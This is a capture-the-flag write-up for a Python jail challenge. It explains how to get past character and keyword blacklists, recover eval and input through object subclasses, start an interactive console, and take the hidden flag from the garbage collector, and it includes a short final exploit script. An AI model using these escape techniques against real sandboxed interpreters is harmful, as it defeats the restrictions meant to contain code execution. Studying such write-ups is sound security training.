## Solve

This challenge is a pyjail with the following limitations:
 - We can't use the following characters:
 ```
 mwfqyhpvzrxk @`\'-+\"*
 ```
 - We can't use the following words:
 `input, self, os, try_escape, eval, breakpoint, flag, system, sys, escape_plan, exec`
 - We can only use ASCII characters
 - Builtins are removed
 - Also, some characters have a limited usage
    - We can only use `)` once
    - We can only use `.` once
    - We can only use `=` once
    - We can only use `_` four times

A few important things:
 - We can execute a maximum of 7 payloads, with a limit of 60 characters each.
 - The variables defined by us will persist between every payload execution.
 - The flag is in a variable called `FLAG`, which is deleted before executing our payloads and the string will be replaced with `srdnlen{REDATTO}`

Since we can't use certain characters, [this script](LINK HERE!!!!!!!!!!!!!!!!!!!) created two years ago by me, could come in handy.

My idea consists in grabbing `eval` and `input` so I can execute arbitrary code. Since there's a character blacklist I had to build the payload while minding the constraints:

```py
(builtins:={}.__class__.__subclasses__()[2].total.__builtins__,lst:=[].__class__(builtins),input:=builtins[lst[28]],eval:=builtins[lst[20]],eval(input(),builtins))
# Inside eval: __import__("code").interact()
```

Now that we have an interactive console, we can restore the flag by dumping all the objects tracked by the python garbage collector:

```py
__import__("gc").get_objects()
```

### Final exploit

```py
[a:={}.__class__]
[b:=a.__subclasses__]
[b:=b()[2].total]
[b:=b.__builtins__]
[a:=[].__class__(b)]
[c:=[b[a[20]],b[a[28]]()]]
__import__("code").interact()
[d:=c[0](c[1],b)]

__import__("gc").get_objects()
```
